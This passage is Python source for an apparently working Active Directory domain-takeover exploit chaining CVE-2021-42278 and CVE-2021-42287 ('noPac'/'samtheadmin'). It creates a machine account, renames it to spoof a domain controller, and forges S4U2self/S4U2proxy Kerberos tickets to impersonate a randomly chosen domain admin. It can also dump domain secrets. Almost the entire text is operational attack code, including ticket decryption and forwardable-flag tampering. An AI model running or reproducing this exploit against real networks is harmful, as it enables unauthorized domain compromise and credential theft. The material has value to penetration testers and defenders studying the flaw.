                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                    samr.hSamrSetInformationUser2(dce, userHandle, req)
                    print("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if servHandle is not None:
                samr.hSamrCloseHandle(dce, servHandle)
            dce.disconnect()

    def run(self,delete=False):
        self.__delete = delete
        self.run_samr()

################################
### =>  IMPORT ADDCOMPUTER.PY
#######################################




class GETST:
    def __init__(self, target, password, domain, options, impersonate_target=None,target_spn=None):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.impersonate_target = impersonate_target
        self.target_spn = target_spn
        self.__force_forwardable = False
        self.__additional_ticket = None
        self.__saveFileName = None
        self.__no_s4u2proxy = True
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')


    def saveTicket(self, ticket, sessionKey):
        print(f"Saving a user\'s ticket in {self.__saveFileName + '.ccache'}")
        ccache = CCache()

        ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
        if not os.path.isfile(additional_ticket_path):
            print(f"Ticket {additional_ticket_path} doesn't exist")
            exit(0)
        else:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            print(f"\tUsing additional ticket {additional_ticket_path} instead of S4U2Self")
            ccache = CCache.loadFile(additional_ticket_path)
            principal = ccache.credentials[0].header['server'].prettyPrint()
            creds = ccache.getCredential(principal.decode())
            TGS = creds.toTGS(principal)

            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('TGS_REP')
                print(tgs.prettyPrint())

            if self.__force_forwardable:
                # Convert hashes to binary form, just in case we're receiving strings
                if isinstance(nthash, str):
                    try:
                        nthash = unhexlify(nthash)
                    except TypeError:
                        pass
                if isinstance(aesKey, str):
                    try:
                        aesKey = unhexlify(aesKey)
                    except TypeError:
                        pass

                # Compute NTHash and AESKey if they're not provided in arguments
                if self.__password != '' and self.__domain != '' and self.__user != '':
                    if not nthash:
                        nthash = compute_nthash(self.__password)
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('NTHash')
                            print(hexlify(nthash).decode())
                    if not aesKey:
                        salt = self.__domain.upper() + self.__user
                        aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('AESKey')
                            print(hexlify(aesKey).decode())

                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
                cipherText = tgs['ticket']['enc-part']['cipher']

                # Check which cipher was used to encrypt the ticket. It's not always the same
                # This determines which of our keys we should use for decryption/re-encryption
                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
                if newCipher.enctype == Enctype.RC4:
                    key = Key(newCipher.enctype, nthash)
                else:
                    key = Key(newCipher.enctype, aesKey)

                # Decrypt and decode the ticket
                # Key Usage 2
                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
                #  application session key), encrypted with the service key
                #  (section 5.4.2)
                plainText = newCipher.decrypt(key, 2, cipherText)
                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

                # Print the flags in the ticket before modification
                print(f'\tService ticket from S4U2self flags: {str(encTicketPart["flags"])}')
                print('\tService ticket from S4U2self is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Customize flags the forwardable flag is the only one that really matters
                print('\tForcing the service ticket to be forwardable')
                # convert to string of bits
                flagBits = encTicketPart['flags'].asBinary()
                # Set the forwardable flag. Awkward binary string insertion
                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
                # Overwrite the value with the new bits
                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

                print('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
                print('\tService ticket now is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Re-encode and re-encrypt the ticket
                # Again, Key Usage 2
                encodedEncTicketPart = encoder.encode(encTicketPart)
                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

                # put it back in the TGS
                tgs['ticket']['enc-part']['cipher'] = cipherText

            ################################################################################
            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
            # So here I have a ST for me.. I now want a ST for another service
            # Extract the ticket from the TGT
            ticketTGT = Ticket()
            ticketTGT.from_asn1(decodedTGT['ticket'])

            # Get the service ticket
            ticket = Ticket()
            ticket.from_asn1(tgs['ticket'])

            apReq = AP_REQ()
            apReq['pvno'] = 5
            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = list()
            apReq['ap-options'] = constants.encodeFlags(opts)
            seq_set(apReq, 'ticket', ticketTGT.to_asn1)

            authenticator = Authenticator()
            authenticator['authenticator-vno'] = 5
            authenticator['crealm'] = str(decodedTGT['crealm'])

            clientName = Principal()
            clientName.from_asn1(decodedTGT, 'crealm', 'cname')

            seq_set(authenticator, 'cname', clientName.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = KerberosTime.to_asn1(now)

            encodedAuthenticator = encoder.encode(authenticator)

            # Key Usage 7
            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
            # TGS authenticator subkey), encrypted with the TGS session
            # key (Section 5.5.1)
            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

            apReq['authenticator'] = noValue
            apReq['authenticator']['etype'] = cipher.enctype
            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

            encodedApReq = encoder.encode(apReq)

            tgsReq = TGS_REQ()

            tgsReq['pvno'] = 5
            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
            tgsReq['padata'] = noValue
            tgsReq['padata'][0] = noValue
            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
            tgsReq['padata'][0]['padata-value'] = encodedApReq

            # Add resource-based constrained delegation support
            paPacOptions = PA_PAC_OPTIONS()
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

            reqBody = seq_set(tgsReq, 'req-body')

            opts = list()
            # This specified we're doing S4U
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)

            reqBody['kdc-options'] = constants.encodeFlags(opts)
            service2 = Principal(self.target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(reqBody, 'sname', service2.components_to_asn1)
            reqBody['realm'] = self.__domain

            myTicket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            reqBody['till'] = KerberosTime.to_asn1(now)
            reqBody['nonce'] = random.getrandbits(31)
            seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                         )
            message = encoder.encode(tgsReq)

            print('\tRequesting S4U2Proxy')
            r = sendReceive(message, self.__domain, kdcHost)

            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

            cipherText = tgs['enc-part']['cipher']

            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key (Section 5.4.2)
            plainText = cipher.decrypt(sessionKey, 8, cipherText)

            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

            # Creating new cipher based on received keytype
            cipher = _enctype_table[encTGSRepPart['key']['keytype']]

            return r, cipher, sessionKey, newSessionKey

    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.impersonate_target, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(self.impersonate_target) + b(self.__domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('CheckSum')
            hexdump(checkSum)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('PA_FOR_USER_ENC')
            print(paForUserEnc.prettyPrint())

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        if self.__no_s4u2proxy and self.target_spn is not None:
            serverName = Principal(self.target_spn, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        else:
            serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        print('\tRequesting S4U2self')
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        if self.__force_forwardable:
            # Convert hashes to binary form, just in case we're receiving strings
            if isinstance(nthash, str):
                try:
                    nthash = unhexlify(nthash)
                except TypeError:
                    pass
            if isinstance(aesKey, str):
                try:
                    aesKey = unhexlify(aesKey)
                except TypeError:
                    pass

            # Compute NTHash and AESKey if they're not provided in arguments
            if self.__password != '' and self.__domain != '' and self.__user != '':
                if not nthash:
                    nthash = compute_nthash(self.__password)
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('NTHash')
                        print(hexlify(nthash).decode())
                if not aesKey:
                    salt = self.__domain.upper() + self.__user
                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('AESKey')
                        print(hexlify(aesKey).decode())

            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
            cipherText = tgs['ticket']['enc-part']['cipher']

            # Check which cipher was used to encrypt the ticket. It's not always the same
            # This determines which of our keys we should use for decryption/re-encryption
            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
            if newCipher.enctype == Enctype.RC4:
                key = Key(newCipher.enctype, nthash)
            else:
                key = Key(newCipher.enctype, aesKey)

            # Decrypt and decode the ticket
            # Key Usage 2
            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
            #  application session key), encrypted with the service key
            #  (section 5.4.2)
            plainText = newCipher.decrypt(key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Print the flags in the ticket before modification
            print('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
            print('\tService ticket from S4U2self is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Customize flags the forwardable flag is the only one that really matters
            print('\tForcing the service ticket to be forwardable')
            # convert to string of bits
            flagBits = encTicketPart['flags'].asBinary()
            # Set the forwardable flag. Awkward binary string insertion
            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
            # Overwrite the value with the new bits
            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

            print('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
            print('\tService ticket now is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Re-encode and re-encrypt the ticket
            # Again, Key Usage 2
            encodedEncTicketPart = encoder.encode(encTicketPart)
            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

            # put it back in the TGS
            tgs['ticket']['enc-part']['cipher'] = cipherText

        if self.__no_s4u2proxy:
            cipherText = tgs['enc-part']['cipher']
            plainText = cipher.decrypt(sessionKey, 8, cipherText)
            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
            # Creating new cipher based on received keytype
            cipher = _enctype_table[encTGSRepPart['key']['keytype']]
            return r, cipher, sessionKey, newSessionKey
        else:
            ################################################################################
            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
            # So here I have a ST for me.. I now want a ST for another service
            # Extract the ticket from the TGT
            ticketTGT = Ticket()
            ticketTGT.from_asn1(decodedTGT['ticket'])

            # Get the service ticket
            ticket = Ticket()
            ticket.from_asn1(tgs['ticket'])

            apReq = AP_REQ()
            apReq['pvno'] = 5
            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = list()
            apReq['ap-options'] = constants.encodeFlags(opts)
            seq_set(apReq, 'ticket', ticketTGT.to_asn1)

            authenticator = Authenticator()
            authenticator['authenticator-vno'] = 5
            authenticator['crealm'] = str(decodedTGT['crealm'])

            clientName = Principal()
            clientName.from_asn1(decodedTGT, 'crealm', 'cname')

            seq_set(authenticator, 'cname', clientName.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = KerberosTime.to_asn1(now)

            encodedAuthenticator = encoder.encode(authenticator)

            # Key Usage 7
            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
            # TGS authenticator subkey), encrypted with the TGS session
            # key (Section 5.5.1)
            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

            apReq['authenticator'] = noValue
            apReq['authenticator']['etype'] = cipher.enctype
            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

            encodedApReq = encoder.encode(apReq)

            tgsReq = TGS_REQ()

            tgsReq['pvno'] = 5
            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
            tgsReq['padata'] = noValue
            tgsReq['padata'][0] = noValue
            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
            tgsReq['padata'][0]['padata-value'] = encodedApReq

            # Add resource-based constrained delegation support
            paPacOptions = PA_PAC_OPTIONS()
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

            reqBody = seq_set(tgsReq, 'req-body')

            opts = list()
            # This specified we're doing S4U
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)

            reqBody['kdc-options'] = constants.encodeFlags(opts)
            service2 = Principal(self.target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(reqBody, 'sname', service2.components_to_asn1)
            reqBody['realm'] = self.__domain

            myTicket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            reqBody['till'] = KerberosTime.to_asn1(now)
            reqBody['nonce'] = random.getrandbits(31)
            seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                         )
            message = encoder.encode(tgsReq)

            print('\tRequesting S4U2Proxy')
            r = sendReceive(message, self.__domain, kdcHost)

            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

            cipherText = tgs['enc-part']['cipher']

            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key (Section 5.4.2)
            plainText = cipher.decrypt(sessionKey, 8, cipherText)

            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

            # Creating new cipher based on received keytype
            cipher = _enctype_table[encTGSRepPart['key']['keytype']]

            return r, cipher, sessionKey, newSessionKey

    def run(self):

        # Do we have a TGT cached?
        tgt = None
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
            print(f"Using Kerberos Cache: {os.getenv('KRB5CCNAME')}")
            principal = f'krbtgt/{self.__domain.upper()}@{self.__domain.upper()}'
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
                oldSessionKey = sessionKey
                print('Using TGT from cache')
            else:
                logging.debug("No valid credentials found in cache. ")
        except Exception:
            # No cache present
            pass

        if tgt is None:
            # Still no TGT
            userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            print('Getting TGT for user')
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                    self.__aesKey,
                                                                    self.__kdcHost)


        try:
            print('Impersonating %s' % self.impersonate_target)
            # Editing below to pass hashes for decryption
            if self.__additional_ticket is not None:
                tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                self.__kdcHost, self.__additional_ticket)
            else:
                tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
        except Exception as e:
            print("Exception", exc_info=True)
            print(str(e))
            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
                print(f'Probably user {self.__user} does not have constrained delegation permisions or impersonated user does not exist')
            if str(e).find('KDC_ERR_BADOPTION') >= 0:
                print(f'Probably SPN is not allowed to delegate by user {self.__user} or initial TGT not forwardable')

            raise e
        self.__saveFileName = self.impersonate_target

        self.saveTicket(tgs, oldSessionKey)



# from utils.S4U2self import GETST
# from utils.addcomputer import AddComputerSAMR
# from utils.helper import *
# from utils.secretsdump import DumpSecrets
# from utils.smbexec import CMDEXEC

characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")


def banner():
    return """
███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████
    """


def exploit(dcfull, adminticket, options):
    if options.shell or options.dump:
        print("Pls make sure your choice hostname and the -dc-ip are same machine !!")
        print('Exploiting..')
    # export KRB5CCNAME
    os.environ["KRB5CCNAME"] = adminticket
    # if options.shell:
    #     try:
    #         executer = CMDEXEC('', '', domain, None, None, True, options.dc_ip,
    #                            options.mode, options.share, int(options.port), options.service_name, options.shell_type,
    #                            options.codec)
    #         executer.run(dcfull, options.dc_ip)
    #     except Exception as e:
    #         if logging.getLogger().level == logging.DEBUG:
    #             import traceback
    #             traceback.print_exc()
    #         print(str(e))
    if options.dump:
        try:
            options.k = True
            options.target_ip = options.dc_ip
            options.system = options.bootkey = options.security = options.system = options.ntds = options.sam = options.resumefile = options.outputfile = None
            dumper = DumpSecrets(dcfull, '', '',
                                 domain, options)
            dumper.dump()
        except Exception:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            print(str(Exception))


def samtheadmin(username, password, domain, options):
    if options.no_add and not options.target_name:
        print('Net input a target with `-target-name` !')
        return
    if options.target_name:
        new_computer_name = options.target_name
    else:
        new_computer_name = 'WIN-' + ''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()

    if new_computer_name[-1] != '$':
        new_computer_name += '$'

    if options.no_add:
        if options.old_hash:
            if ":" not in options.old_hash:
                print("Hash format error.")
                return
            options.old_pass = options.old_hash

        if options.old_pass:
            new_computer_password = options.old_pass
        else:
            # if change the computer password, trust relationship between target computer and the primary domain may failed !
            print("Net input the password with `-old-pass` or `-old-hash` !")
            return
    else:
        options.old_pass = options.old_hash = ""
        if options.new_pass:
            new_computer_password = options.new_pass
        else:
            new_computer_password = ''.join(random.choice(characters) for _ in range(12))

    domain, username, password, lmhash, nthash = parse_identity(options)
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)

    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
    check_domain = ".".join(domain_dumper.getRoot().replace("DC=", "").split(","))
    if domain != check_domain:
        print("Pls use full domain name, such as: domain.com/username")
        return
    MachineAccountQuota = 10
    # check MAQ and options
    for i in domain_dumper.getDomainPolicy():
        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))

    if MachineAccountQuota < 1 and not options.no_add and not options.create_child:
        print(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
        return
    else:
        print(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')

    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn and options.no_add:
        print(f'{new_computer_name} already exists! Using no-add mode.')
        if not options.old_pass:
            if options.use_ldap:
                print('Modify password need ldaps !')
                return
            ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
            if ldap_session.result['result'] == 0:
                print(
                    f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
            else:
                print('Cannot change the machine password , exit.')
                return
    elif options.no_add and not dn:
        print(f'Target {new_computer_name} not exists!')
        return
    elif dn:
        print(f'Account {new_computer_name} already exists!')
        return

    if options.dc_host:
        dc_host = options.dc_host.upper()
        dcfull = f'{dc_host}.{domain}'
        dn = get_user_info(dc_host + "$", ldap_session, domain_dumper)
        if not dn:
            print(f'Machine not found in LDAP: {dc_host}')
            return
    else:
        dcinfo = get_dc_host(ldap_session, domain_dumper, options)
        if len(dcinfo) == 0:
            print("Cannot get domain info")
            exit()
        c_key = 0
        dcs = list(dcinfo.keys())
        if len(dcs) > 1:
            print('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
            cnt = 0
            for name in dcs:
                print(f"{cnt}: {name}")
                cnt += 1
            while True:
                try:
                    c_key = int(input(">>> Your choice: "))
                    if c_key in range(len(dcs)):
                        break
                except Exception:
                    pass
        dc_host = dcs[c_key].lower()
        dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
    print(f'Selected Target {dcfull}')
    if options.impersonate:
        domain_admin = options.impersonate
    else:
        domainAdmins = get_domain_admins(ldap_session, domain_dumper)
        print(f'Total Domain Admins {len(domainAdmins)}')
        domain_admin = random.choice(domainAdmins)

    print(f'will try to impersonate {domain_admin}')
    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
    if os.path.exists(adminticket):
        print(f'Already have user {domain_admin} ticket for target {dcfull}')
        exploit(dcfull, adminticket, options)
        return

    if not options.no_add:
        print(f'Adding Computer Account "{new_computer_name}"')
        print(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')

        # Creating Machine Account
        addmachineaccount = AddComputerSAMR(
            username,
            password,
            domain,
            options,
            computer_name=new_computer_name,
            computer_pass=new_computer_password)
        addmachineaccount.run()

    # CVE-2021-42278
    new_machine_dn = None
    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn:
        new_machine_dn = str(dn['dn'])
        print(f'{new_computer_name} object = {new_machine_dn}')

    if new_machine_dn:
        ldap_session.modify(new_machine_dn, {'sAMAccountName': [ldap3.MODIFY_REPLACE, [dc_host]]})
        if ldap_session.result['result'] == 0:
            print(f'{new_computer_name} sAMAccountName == {dc_host}')
        else:
            print('Cannot rename the machine account , Reason {}'.format(ldap_session.result['message']))
            if not options.no_add:
                del_added_computer(ldap_session, domain_dumper, new_computer_name)
            return
    else:
        return

    # make hash none, we don't need id now.
    options.hashes = None

    # Getting a ticke
    try:
        getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
        getting_tgt.run()
    except Exception as e:
        print(f"GetTGT error, error: {e}")
        # Restoring Old Values when get TGT error.
        print(f"Reseting the machine account to {new_computer_name}")
        dn = get_user_info(dc_host, ldap_session, domain_dumper)
        ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
        if ldap_session.result['result'] == 0:
            print(f'Restored {new_computer_name} sAMAccountName to original value')
        else:
            print('Cannot restore the old name lol')
        return

    dcticket = str(dc_host + '.ccache')

    # Restoring Old Values
    print(f"Reseting the machine account to {new_computer_name}")
    dn = get_user_info(dc_host, ldap_session, domain_dumper)
    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
    if ldap_session.result['result'] == 0:
        print(f'Restored {new_computer_name} sAMAccountName to original value')
    else:
        print('Cannot restore the old name lol')

    os.environ["KRB5CCNAME"] = dcticket

    try:
        executer = GETST(None, None, domain, options,
                         impersonate_target=domain_admin,
                         target_spn=f"{options.spn}/{dcfull}")
        executer.run()
    except Exception as e:
        print(f"GetST error, error: {e}")
        return

    print(f'Rename ccache to {adminticket}')
    os.rename(f'{domain_admin}.ccache', adminticket)

    # Delete domain computer we just added.
    if not options.no_add:
